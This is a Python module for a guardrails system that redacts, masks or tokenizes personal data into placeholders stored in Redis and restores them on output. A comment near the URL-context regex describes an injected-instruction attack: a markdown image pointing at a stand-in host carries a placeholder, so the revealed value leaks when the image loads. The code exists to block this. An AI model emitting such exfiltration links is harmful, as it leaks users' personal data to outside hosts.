"""Masking modes (brief 08): redact `[CODE]`, mask (last characters visible), tokenize
`<<PII_n>>` with the mapping in Redis for the run (`PII_TOKEN_TTL_S`), reversed on the way out.

C17 (08-tam-1a): reversal happens at the exit only (the stored text and the history stay
tokenized). `PlaceholderAligner` keeps a placeholder whole across stream chunks on the writing
side; `StreamDetokenizer` aligns and reverses a stream one request reads and writes;
`detokenize_json` reverses every string of an event's data.
"""

import json
import logging
import re
from collections.abc import Sequence
from typing import Any, Protocol

from ffcore.guardrails.findings import Finding

KEEP_VISIBLE = 4
PLACEHOLDER = re.compile(r"<<PII_\d+>>")
# plan/08 C17: a stream holds at most 16 characters while a placeholder may still be open:
# `<<PII_` + up to 8 digits + `>>`. A longer run is not a placeholder and passes as it is.
PLACEHOLDER_MAX_CHARS = 16
_OPEN_PLACEHOLDER = re.compile(r"<(?:<(?:P(?:I(?:I(?:_(?:\d{1,8}>?)?)?)?)?)?)?")

log = logging.getLogger(__name__)


class RevealUnavailable(RuntimeError):
    """The token store could not be read at the exit (C17, r1 MINOR-11): the reader's stream ends
    with an error event instead of breaking without one or showing placeholders silently."""


class TokenScopeMissing(ValueError):
    """tokenize needs a scope (the run id); without one the mapping could not be reversed."""


class TokenStore(Protocol):
    async def token_for(self, scope: str, key: str, value: str) -> str: ...

    async def lookup(self, scope: str, token: str) -> str | None: ...

    async def reserve(self, scope: str, number: int) -> None:
        """The scope's next placeholder number is above `number` (08-tam-1a r1 MAJOR-2: a
        placeholder carried over from an earlier scope never becomes a new value's)."""
        ...


def _identity(category: str, value: str) -> str:
    # Exactly the same value gets the same placeholder. No normalisation: "a.b@x" and "ab@x" are
    # different addresses (review r1); a reformatted number gets a new placeholder, never a
    # wrong one.
    return category + ":" + value


class MemoryTokenStore:
    """In-process store for unit tests and the dry-run test panel."""

    def __init__(self) -> None:
        self._scopes: dict[str, dict[str, str]] = {}
        self._counters: dict[str, int] = {}

    async def token_for(self, scope: str, key: str, value: str) -> str:
        mapping = self._scopes.setdefault(scope, {})
        if "k:" + key not in mapping:
            self._counters[scope] = self._counters.get(scope, 0) + 1
            token = f"<<PII_{self._counters[scope]}>>"
            mapping["k:" + key] = token
            mapping["t:" + token] = value
        return mapping["k:" + key]

    async def lookup(self, scope: str, token: str) -> str | None:
        return self._scopes.get(scope, {}).get("t:" + token)

    async def reserve(self, scope: str, number: int) -> None:
        self._counters[scope] = max(self._counters.get(scope, 0), number)


# Get-or-create in one Redis call: Lua runs atomically, so no caller ever sees the forward entry
# (`k:`) without the reverse one (`t:`) (review r1). The counter lives in its own key with a long
# lifetime (r1 MAJOR-1, KARARLAR "Yer tutucu sayacı"): when the mapping expires
# (PII_TOKEN_TTL_S), a new value in the same scope gets the next number, never an old one, so a
# stored placeholder is never read as another person's value. A mapping written before the
# counter key existed seeds it from its own `n` field.
_TOKEN_FOR = """
local token = redis.call('HGET', KEYS[1], 'k:' .. ARGV[1])
if not token then
  if redis.call('EXISTS', KEYS[2]) == 0 then
    local seed = redis.call('HGET', KEYS[1], 'n')
    if seed then redis.call('SET', KEYS[2], seed) end
  end
  token = '<<PII_' .. redis.call('INCR', KEYS[2]) .. '>>'
  redis.call('HSET', KEYS[1], 'k:' .. ARGV[1], token, 't:' .. token, ARGV[2])
end
redis.call('EXPIRE', KEYS[1], ARGV[3])
redis.call('EXPIRE', KEYS[2], ARGV[4])
return token
"""

_RESERVE = """
local current = tonumber(redis.call('GET', KEYS[1]) or '0')
if current < tonumber(ARGV[1]) then
  redis.call('SET', KEYS[1], ARGV[1])
end
redis.call('EXPIRE', KEYS[1], ARGV[2])
return 1
"""

# The counter outlives every stored copy of a placeholder: run events and messages are kept at
# most a year by retention (03c: jobs 90-365 days, content 1-90).
COUNTER_TTL_S = 400 * 24 * 3600


class RedisTokenStore:
    """One hash per scope: `k:<identity>` → token, `t:<token>` → value; the counter in
    `<prefix>n:<scope>`.

    The mapping's TTL is renewed on every write and every lookup, so it lives as long as the run
    uses it (r1 MAJOR-1: a long wait for an approval that still reads its placeholders).
    """

    def __init__(self, redis, ttl_s: int, prefix: str = "ffcore:pii:") -> None:
        self._redis = redis
        self._ttl = ttl_s
        self._prefix = prefix

    def _keys(self, scope: str) -> tuple[str, str]:
        return self._prefix + scope, self._prefix + "n:" + scope

    async def token_for(self, scope: str, key: str, value: str) -> str:
        mapping, counter = self._keys(scope)
        token = await self._redis.eval(
            _TOKEN_FOR, 2, mapping, counter, key, value, self._ttl, COUNTER_TTL_S
        )
        return token.decode() if isinstance(token, bytes) else token

    async def lookup(self, scope: str, token: str) -> str | None:
        mapping, _ = self._keys(scope)
        value = await self._redis.hget(mapping, "t:" + token)
        if value is not None:
            await self._redis.expire(mapping, self._ttl)
        return value.decode() if isinstance(value, bytes) else value

    async def reserve(self, scope: str, number: int) -> None:
        _, counter = self._keys(scope)
        await self._redis.eval(_RESERVE, 1, counter, number, COUNTER_TTL_S)


def redact_label(category: str) -> str:
    return f"[{category}]"


def mask_value(category: str, value: str) -> str:
    """A masked value never equals the raw one (review r1): at most the last four characters,
    and never more than half of them, stay visible; a one-letter e-mail local part becomes "*"."""
    if category == "EMAIL_ADDRESS" and "@" in value:
        local, _, domain = value.partition("@")
        head = local[:1] if len(local) > 1 else ""
        return head + "*" * (len(local) - len(head)) + "@" + domain
    alnum = sum(1 for c in value if c.isalnum())
    visible = min(KEEP_VISIBLE, alnum // 2)
    hide, out = alnum - visible, []
    for char in value:
        if char.isalnum() and hide > 0:
            out.append("*")
            hide -= 1
        else:
            out.append(char)
    masked = "".join(out)
    if masked == value:
        # Nothing alphanumeric to hide ("...", "--"): mask every character instead.
        masked = "*" * len(value)
    return masked


async def apply_action(
    text: str,
    findings: Sequence[Finding],
    action: str,
    *,
    store: TokenStore | None = None,
    scope: str | None = None,
) -> str:
    """Rewrite `text` for a transforming action; other actions return it unchanged."""
    return await apply_findings(text, [(f, action) for f in findings], store=store, scope=scope)


async def apply_findings(
    text: str,
    actions: Sequence[tuple[Finding, str]],
    *,
    store: TokenStore | None = None,
    scope: str | None = None,
) -> str:
    """Rewrite each finding with its own action (a PII policy may mix redact, mask, tokenize).

    Findings must not overlap (recognizers resolve overlaps). Non-transforming actions keep text.
    """
    ordered = sorted(
        ((f, a) for f, a in actions if a in ("redact", "mask", "tokenize")),
        key=lambda x: x[0].start,
    )
    if any(a == "tokenize" for _, a in ordered) and (store is None or not scope):
        raise TokenScopeMissing("tokenize needs a token store and a scope (run id)")
    out, cursor = [], 0
    for finding, action in ordered:
        if action == "redact":
            replacement = redact_label(finding.category)
        elif action == "mask":
            replacement = mask_value(finding.category, finding.value)
        else:
            key = _identity(finding.category, finding.value)
            replacement = await store.token_for(scope, key, finding.value)
        out.append(text[cursor : finding.start])
        out.append(replacement)
        cursor = finding.end
    out.append(text[cursor:])
    return "".join(out)


async def detokenize(text: str, *, store: TokenStore, scope: str) -> tuple[str, list[str]]:
    """Put the original values back. Placeholders the run never issued stay as they are and are
    returned in `unresolved` (a model can invent one); nothing is guessed."""
    unresolved: list[str] = []
    out, cursor = [], 0
    for match in PLACEHOLDER.finditer(text):
        value = await store.lookup(scope, match.group(0))
        out.append(text[cursor : match.start()])
        if value is None:
            unresolved.append(match.group(0))
            out.append(match.group(0))
        else:
            out.append(value)
        cursor = match.end()
    out.append(text[cursor:])
    return "".join(out), unresolved


class PlaceholderAligner:
    """The writing side of a stream: `feed` returns the text that may be published now, holding
    back a tail that could be the start of a placeholder (at most 15 characters) until the next
    chunk shows how it ends; `flush` returns that tail at the end of the stream, as it is."""

    def __init__(self) -> None:
        self._held = ""

    def feed(self, text: str) -> str:
        buffer = self._held + text
        cut = len(buffer)
        for i in range(max(0, len(buffer) - (PLACEHOLDER_MAX_CHARS - 1)), len(buffer)):
            if buffer[i] == "<" and _OPEN_PLACEHOLDER.fullmatch(buffer, i):
                cut = i
                break
        self._held = buffer[cut:]
        return buffer[:cut]

    def flush(self) -> str:
        held, self._held = self._held, ""
        return held


# r1 MAJOR-3 (KARARLAR "C17 geri çevirme bağlam istisnası", A): a placeholder inside a URL or
# a markdown link/image target is not reversed. An upstream (external agent, provider, injected
# instruction) could write `![x](https://its-host/?q=<<PII_1>>)`, and a client that loads images
# would send the value to that host. Contexts run up to the next whitespace: a markdown target
# `](...`, an `href=...` attribute value, a bare `scheme://...`.
_URL_CONTEXT = re.compile(r"\]\(\S*|\bhref\s*=\s*\S*|\b[a-z][a-z0-9+.-]*://\S*", re.IGNORECASE)
# How much of the text before a chunk a stream keeps to see a URL that began earlier: the text
# after the last whitespace, at most this long (a longer URL loses its start: a known limit).
URL_CONTEXT_MAX_CHARS = 8192


def _url_spans(text: str) -> list[tuple[int, int]]:
    return [m.span() for m in _URL_CONTEXT.finditer(text)]


def _context_tail(text: str) -> str:
    cut = max(text.rfind(c) for c in " \t\n\r")
    return text[cut + 1 :][-URL_CONTEXT_MAX_CHARS:]


async def reveal_text(
    text: str, *, store: TokenStore, scope: str, context: str = "", json_escape: bool = False
) -> tuple[str, int, int]:
    """(text with this scope's placeholders turned back into values, unresolved count, kept in a
    URL count). `context` is the text that came just before in the same stream, so a URL that
    began in an earlier chunk is seen. `json_escape` writes each value as it must appear inside
    a JSON string (tool call arguments, r1 MINOR-3)."""
    if "<<PII_" not in text:
        return text, 0, 0
    whole = context + text
    spans = _url_spans(whole)
    shift = len(context)
    out, cursor, unresolved, skipped = [], 0, 0, 0
    for match in PLACEHOLDER.finditer(text):
        start, end = match.start() + shift, match.end() + shift
        out.append(text[cursor : match.start()])
        cursor = match.end()
        if any(a <= start and end <= b for a, b in spans):
            skipped += 1
            out.append(match.group(0))
            continue
        value = await store.lookup(scope, match.group(0))
        if value is None:
            unresolved += 1
            out.append(match.group(0))
        else:
            out.append(json.dumps(value, ensure_ascii=False)[1:-1] if json_escape else value)
    out.append(text[cursor:])
    return "".join(out), unresolved, skipped


class StreamDetokenizer:
    """Aligner + reversal for a stream one request writes and reads (the facade's direct model
    path): no chunk it returns contains a placeholder the scope issued, split or whole, except
    inside a URL (kept, `skipped_url`). `unresolved` counts placeholders the scope never issued
    (left as they are)."""

    def __init__(self, store: TokenStore, scope: str, *, json_escape: bool = False) -> None:
        self._store, self._scope, self._json = store, scope, json_escape
        self._aligner = PlaceholderAligner()
        self._context = ""
        self.unresolved = 0
        self.skipped_url = 0

    async def _reverse(self, text: str) -> str:
        out, unresolved, skipped = await reveal_text(
            text,
            store=self._store,
            scope=self._scope,
            context=self._context,
            json_escape=self._json,
        )
        self._context = _context_tail(self._context + text)
        self.unresolved += unresolved
        self.skipped_url += skipped
        return out

    async def feed(self, text: str) -> str:
        return await self._reverse(self._aligner.feed(text))

    async def flush(self) -> str:
        return await self._reverse(self._aligner.flush())


class ContextReveal:
    """Reversal of a run's event data (C17), one reader: strings within the scope; the `token`
    events of a live stream share a context, so a URL split over two entries is seen."""

    def __init__(self, store: TokenStore, scope: str) -> None:
        self._store, self._scope = store, scope
        self._context = ""
        self.unresolved = 0
        self.skipped_url = 0

    async def data(self, data: Any, *, stream_text: bool = False) -> Any:
        if stream_text and isinstance(data, dict) and isinstance(data.get("text"), str):
            text, unresolved, skipped = await reveal_text(
                data["text"], store=self._store, scope=self._scope, context=self._context
            )
            self._context = _context_tail(self._context + data["text"])
            self.unresolved += unresolved
            self.skipped_url += skipped
            return {**data, "text": text}
        out, unresolved, skipped = await detokenize_json(data, store=self._store, scope=self._scope)
        self.unresolved += unresolved
        self.skipped_url += skipped
        return out


async def detokenize_json(data: Any, *, store: TokenStore, scope: str) -> tuple[Any, int, int]:
    """(a copy of `data` with every string reversed within `scope`, unresolved count, kept in a
    URL count): placeholders stay where the scope never issued them, the mapping expired or
    they sit in a URL."""
    if isinstance(data, str):
        return await reveal_text(data, store=store, scope=scope)
    if isinstance(data, list):
        items = [await detokenize_json(v, store=store, scope=scope) for v in data]
        return [v for v, _, _ in items], sum(i[1] for i in items), sum(i[2] for i in items)
    if isinstance(data, dict):
        pairs = {k: await detokenize_json(v, store=store, scope=scope) for k, v in data.items()}
        return (
            {k: v for k, (v, _, _) in pairs.items()},
            sum(i[1] for i in pairs.values()),
            sum(i[2] for i in pairs.values()),
        )
    return data, 0, 0


def log_skipped_url(scope: str, count: int) -> None:
    """r1 MAJOR-3: placeholders kept because they sit in a URL; scope and count, never a
    value."""
    if count:
        log.info("detokenize_skipped_url scope=%s count=%d", scope, count)


def log_unresolved(scope: str, count: int) -> None:
    """S9 (K-08T1-0002): a placeholder that cannot be reversed stays; it is logged with the
    scope and the count, never the value."""
    if count:
        log.warning("detokenize_unresolved scope=%s count=%d", scope, count)


def placeholder_numbers(text: str) -> list[int]:
    """The numbers of the placeholders in `text` (`<<PII_7>>` → 7)."""
    return [int(m.group(0)[6:-2]) for m in PLACEHOLDER.finditer(text)]


def count_placeholders(data: Any) -> int:
    """How many placeholders the strings of `data` carry (no lookup, no value)."""
    if isinstance(data, str):
        return len(PLACEHOLDER.findall(data)) if "<<PII_" in data else 0
    if isinstance(data, list):
        return sum(count_placeholders(v) for v in data)
    if isinstance(data, dict):
        return sum(count_placeholders(v) for v in data.values())
    return 0


def log_skipped_policy(scope: str, count: int) -> None:
    """K-08T1-0004: placeholders kept at the exit because the policy enforces a `pii` rule on
    the output; logged with the scope and the count, never a value."""
    if count:
        log.info("detokenize_skipped_policy scope=%s count=%d", scope, count)
